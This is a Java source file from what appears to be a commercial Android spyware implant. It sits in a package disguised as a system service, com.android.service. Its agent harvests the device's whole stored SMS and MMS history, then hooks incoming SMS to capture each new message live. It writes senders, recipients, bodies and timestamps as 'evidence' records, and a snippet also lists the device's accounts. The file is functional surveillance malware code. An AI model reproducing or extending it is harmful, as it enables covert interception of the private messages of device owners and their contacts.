/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MessageAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;

import android.accounts.Account;
import android.accounts.AccountManager;

import com.android.service.LogR;
import com.android.service.Mms;
import com.android.service.Sms;
import com.android.service.Status;
import com.android.service.agent.sms.MmsBrowser;
import com.android.service.agent.sms.SmsBrowser;
import com.android.service.auto.Cfg;
import com.android.service.evidence.EvidenceType;
import com.android.service.evidence.Markup;
import com.android.service.interfaces.Observer;
import com.android.service.interfaces.SmsHandler;
import com.android.service.listener.ListenerSms;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

/**
 * The Class MessageAgent.
 * 
 * @author zeno -> Ahahah ti piacerebbe eh?? :>
 * @real-author Que, r0x
 */
public class AgentMessage extends AgentBase implements Observer<Sms> {
	private static final String TAG = "AgentMessage";

	private static final int SMS_VERSION = 2010050501;

	// private SmsHandler smsHandler;

	@Override
	public void begin() {
		ListenerSms.self().attach(this);

		final Markup storedImsi = new Markup(AgentType.AGENT_SMS);

		// Abbiamo gia' catturato lo storico
		if (storedImsi.isMarkup() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (begin): cattura sms di storico");
			}

			final SmsBrowser smsBrowser = new SmsBrowser();
			final ArrayList<Sms> listSms = smsBrowser.getSmsList();
			final Iterator<Sms> iterSms = listSms.listIterator();

			while (iterSms.hasNext()) {
				final Sms s = iterSms.next();
				saveSms(s);
			}

			final MmsBrowser mmsBrowser = new MmsBrowser();
			final ArrayList<Mms> listMms = mmsBrowser.getMmsList();
			final Iterator<Mms> iterMms = listMms.listIterator();

			while (iterMms.hasNext()) {
				final Mms mms = iterMms.next();
				mms.print();
				saveMms(mms);
			}

			// Scriviamo il markup
			storedImsi.writeMarkup(Utils.longToByteArray(System.currentTimeMillis()));
		}

		// Iniziamo la cattura live
		final SmsHandler smsHandler = new SmsHandler();
		smsHandler.start();
	}

	@Override
	public void end() {
		ListenerSms.self().detach(this);
		// smsHandler.quit();
	}

	@Override
	public boolean parse(AgentConf conf) {
		setPeriod(NEVER);
		setDelay(100);

		return true;
	}

	@Override
	public void go() {

	}

	public int notification(Sms s) {
		// Live SMS
		saveSms(s);
		return 0;
	}

	// SNIPPET
	/**
	 * Check email accounts.
	 */
	private void checkEmailAccounts() {
		final Account[] accounts = AccountManager.get(Status.getAppContext()).getAccounts();

		for (final Account account : accounts) {

			final String name = account.name;
			if (Cfg.DEBUG) {
				Check.log(TAG + name);
			}
		}
	}

	private void saveSms(Sms sms) {
		final String address = sms.getAddress();
		final byte[] body = WChar.getBytes(sms.getBody());
		final long date = sms.getDate();
		final boolean sent = sms.getSent();

		saveEvidence(address, body, date, sent);
	}

	private void saveMms(Mms mms) {
		final String address = mms.getAddress();
		final byte[] subject = WChar.getBytes("MMS Subject: " + mms.getSubject());
		final long date = mms.getDate();
		final DateTime filetime = new DateTime(date);
		final boolean sent = mms.getSent();

		saveEvidence(address, subject, date, sent);
	}

	private void saveEvidence(String address, byte[] body, long date, boolean sent) {
		final DateTime filetime = new DateTime(new Date(date));

		String from, to;

		int flags;

		if (sent) {
			flags = 0;
			from = "local";
			to = address;
		} else {
			flags = 1;
			to = "local";
			from = address;
		}

		final int additionalDataLen = 48;
		final byte[] additionalData = new byte[additionalDataLen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, additionalDataLen);
		databuffer.writeInt(SMS_VERSION);
		databuffer.writeInt(flags);
		databuffer.writeLong(filetime.getFiledate());
		databuffer.write(Utils.padByteArray(from.getBytes(), 16));
		databuffer.write(Utils.padByteArray(to.getBytes(), 16));

		new LogR(EvidenceType.SMS_NEW, additionalData, body);
	}
}
